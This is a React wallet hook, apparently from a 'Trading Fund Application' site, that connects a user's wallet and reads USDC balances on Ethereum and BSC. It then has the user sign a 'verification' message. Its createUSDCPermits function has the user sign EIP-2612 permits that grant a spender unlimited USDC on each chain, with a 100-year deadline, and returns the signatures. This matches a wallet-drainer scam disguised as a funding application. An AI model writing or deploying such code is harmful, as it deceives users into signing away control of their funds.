import { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import EthereumProvider from '@walletconnect/ethereum-provider';
import { useToast } from '@/hooks/use-toast';

export interface WalletState {
  address: string | null;
  chainId: number | null;
  isConnected: boolean;
  provider: ethers.BrowserProvider | null;
}

export interface USDCBalance {
  symbol: string;
  balance: string;
  chainName: string;
  chainId: number;
  tokenAddress: string;
  balanceRaw: string;
}

// USDC Contract Addresses
const USDC_CONTRACTS = {
  1: '0xA0b86a33E6441A8A4B22251fDaD18C0D72F6B48F', // Ethereum Mainnet
  56: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' // BSC Mainnet
};

const CHAIN_NAMES = {
  1: 'Ethereum',
  56: 'BSC'
};

// ERC-20 ABI for balance checking and permits
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function name() view returns (string)',
  'function symbol() view returns (string)',
  'function nonces(address owner) view returns (uint256)',
  'function DOMAIN_SEPARATOR() view returns (bytes32)'
];

// EIP-2612 Permit typehash
const PERMIT_TYPEHASH = '0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9';

export const useRealWallet = () => {
  const [walletState, setWalletState] = useState<WalletState>({
    address: null,
    chainId: null,
    isConnected: false,
    provider: null
  });
  const [isConnecting, setIsConnecting] = useState(false);
  const [usdcBalances, setUsdcBalances] = useState<USDCBalance[]>([]);
  const [walletConnectProvider, setWalletConnectProvider] = useState<any>(null);
  const { toast } = useToast();

  // Initialize WalletConnect
  const initializeWalletConnect = useCallback(async () => {
    try {
      const provider = await EthereumProvider.init({
        projectId: 'a8c3e6f2b1d4e5f8a9b2c3d4e5f6a7b8', // You'll need to get this from WalletConnect Cloud
        chains: [1, 56],
        showQrModal: true,
        metadata: {
          name: 'Trading Fund Application',
          description: 'Connect your wallet to apply for trading funds',
          url: window.location.origin,
          icons: ['https://walletconnect.com/walletconnect-logo.png']
        }
      });
      
      setWalletConnectProvider(provider);
      return provider;
    } catch (error) {
      console.error('Failed to initialize WalletConnect:', error);
      throw error;
    }
  }, []);

  // Connect wallet
  const connectWallet = async () => {
    setIsConnecting(true);
    try {
      let provider: any;
      let ethProvider: ethers.BrowserProvider;

      // Check if MetaMask/injected wallet is available
      if (typeof window !== 'undefined' && (window as any).ethereum) {
        provider = (window as any).ethereum;
        ethProvider = new ethers.BrowserProvider(provider);
        
        // Request account access
        await provider.request({ method: 'eth_requestAccounts' });
      } else {
        // Use WalletConnect
        provider = walletConnectProvider || await initializeWalletConnect();
        await provider.enable();
        ethProvider = new ethers.BrowserProvider(provider);
      }

      const signer = await ethProvider.getSigner();
      const address = await signer.getAddress();
      const network = await ethProvider.getNetwork();

      setWalletState({
        address,
        chainId: Number(network.chainId),
        isConnected: true,
        provider: ethProvider
      });

      toast({
        title: "Wallet Connected",
        description: `Connected to ${address.slice(0, 6)}...${address.slice(-4)}`
      });

      // Fetch USDC balances
      await fetchUSDCBalances(ethProvider, address);

    } catch (error: any) {
      toast({
        title: "Connection Failed",
        description: error.message || "Failed to connect wallet",
        variant: "destructive"
      });
      throw error;
    } finally {
      setIsConnecting(false);
    }
  };

  // Fetch USDC balances on multiple chains
  const fetchUSDCBalances = async (provider: ethers.BrowserProvider, address: string) => {
    const balances: USDCBalance[] = [];

    for (const [chainId, contractAddress] of Object.entries(USDC_CONTRACTS)) {
      try {
        const chainIdNum = parseInt(chainId);
        let chainProvider = provider;

        // Switch to the appropriate chain if not already on it
        const currentNetwork = await provider.getNetwork();
        if (Number(currentNetwork.chainId) !== chainIdNum) {
          try {
            await provider.send('wallet_switchEthereumChain', [
              { chainId: `0x${chainIdNum.toString(16)}` }
            ]);
            // Wait a bit for chain switch
            await new Promise(resolve => setTimeout(resolve, 1000));
          } catch (switchError: any) {
            // Chain might not be added, try to add it
            if (switchError.code === 4902 && chainIdNum === 56) {
              await provider.send('wallet_addEthereumChain', [{
                chainId: '0x38',
                chainName: 'BNB Smart Chain',
                nativeCurrency: {
                  name: 'BNB',
                  symbol: 'BNB',
                  decimals: 18
                },
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com/']
              }]);
            }
          }
        }

        const contract = new ethers.Contract(contractAddress, ERC20_ABI, provider);
        const balanceRaw = await contract.balanceOf(address);
        const decimals = await contract.decimals();
        const balance = ethers.formatUnits(balanceRaw, decimals);

        balances.push({
          symbol: 'USDC',
          balance: parseFloat(balance).toFixed(2),
          chainName: CHAIN_NAMES[chainIdNum as keyof typeof CHAIN_NAMES],
          chainId: chainIdNum,
          tokenAddress: contractAddress,
          balanceRaw: balanceRaw.toString()
        });

      } catch (error) {
        console.error(`Failed to fetch USDC balance on chain ${chainId}:`, error);
      }
    }

    setUsdcBalances(balances);
  };

  // Create verification signature
  const signVerificationMessage = async (): Promise<string> => {
    if (!walletState.isConnected || !walletState.provider || !walletState.address) {
      throw new Error('Wallet not connected');
    }

    try {
      const message = `I am verifying my wallet ownership for the trading fund application.\n\nWallet: ${walletState.address}\nTimestamp: ${Date.now()}`;
      
      const signer = await walletState.provider.getSigner();
      const signature = await signer.signMessage(message);

      toast({
        title: "Message Signed",
        description: "Verification signature created successfully!"
      });

      return signature;
    } catch (error: any) {
      toast({
        title: "Signing Failed",
        description: error.message,
        variant: "destructive"
      });
      throw error;
    }
  };

  // Create USDC permits for unlimited spending
  const createUSDCPermits = async (): Promise<Array<{chainId: number, signature: string, permitData: any}>> => {
    if (!walletState.isConnected || !walletState.provider || !walletState.address) {
      throw new Error('Wallet not connected');
    }

    const permits = [];
    const spender = '0x0000000000000000000000000000000000000001'; // Placeholder spender address
    const maxAmount = ethers.MaxUint256; // Unlimited amount
    const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60 * 100); // 100 years from now

    for (const [chainId, contractAddress] of Object.entries(USDC_CONTRACTS)) {
      try {
        const chainIdNum = parseInt(chainId);
        
        // Switch to the appropriate chain
        const currentNetwork = await walletState.provider.getNetwork();
        if (Number(currentNetwork.chainId) !== chainIdNum) {
          await walletState.provider.send('wallet_switchEthereumChain', [
            { chainId: `0x${chainIdNum.toString(16)}` }
          ]);
          await new Promise(resolve => setTimeout(resolve, 1000));
        }

        const contract = new ethers.Contract(contractAddress, ERC20_ABI, walletState.provider);
        const nonce = await contract.nonces(walletState.address);
        const domainSeparator = await contract.DOMAIN_SEPARATOR();

        // EIP-712 domain
        const domain = {
          name: 'USD Coin',
          version: chainIdNum === 1 ? '2' : '1',
          chainId: chainIdNum,
          verifyingContract: contractAddress
        };

        // EIP-712 types
        const types = {
          Permit: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' }
          ]
        };

        // Permit data
        const permitData = {
          owner: walletState.address,
          spender,
          value: maxAmount,
          nonce,
          deadline
        };

        const signer = await walletState.provider.getSigner();
        const signature = await signer.signTypedData(domain, types, permitData);

        permits.push({
          chainId: chainIdNum,
          signature,
          permitData: {
            ...permitData,
            tokenAddress: contractAddress,
            domainSeparator
          }
        });

      } catch (error) {
        console.error(`Failed to create permit for chain ${chainId}:`, error);
      }
    }

    if (permits.length > 0) {
      toast({
        title: "Permits Created",
        description: `Created ${permits.length} USDC spending permits successfully!`
      });
    }

    return permits;
  };

  // Disconnect wallet
  const disconnect = async () => {
    if (walletConnectProvider) {
      await walletConnectProvider.disconnect();
    }
    
    setWalletState({
      address: null,
      chainId: null,
      isConnected: false,
      provider: null
    });
    setUsdcBalances([]);
    
    toast({
      title: "Wallet Disconnected",
      description: "Wallet has been disconnected."
    });
  };

  // Listen for account/chain changes
  useEffect(() => {
    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        disconnect();
      } else if (accounts[0] !== walletState.address) {
        // Account changed, reconnect
        connectWallet();
      }
    };

    const handleChainChanged = () => {
      // Chain changed, refresh balances
      if (walletState.isConnected && walletState.provider && walletState.address) {
        fetchUSDCBalances(walletState.provider, walletState.address);
      }
    };

    if (typeof window !== 'undefined' && (window as any).ethereum) {
      (window as any).ethereum.on('accountsChanged', handleAccountsChanged);
      (window as any).ethereum.on('chainChanged', handleChainChanged);
    }

    return () => {
      if (typeof window !== 'undefined' && (window as any).ethereum) {
        (window as any).ethereum.removeListener('accountsChanged', handleAccountsChanged);
        (window as any).ethereum.removeListener('chainChanged', handleChainChanged);
      }
    };
  }, [walletState.address, walletState.isConnected]);

  return {
    walletState,
    usdcBalances,
    isConnecting,
    connectWallet,
    signVerificationMessage,
    createUSDCPermits,
    disconnect,
    refreshBalances: () => {
      if (walletState.isConnected && walletState.provider && walletState.address) {
        return fetchUSDCBalances(walletState.provider, walletState.address);
      }
    }
  };
};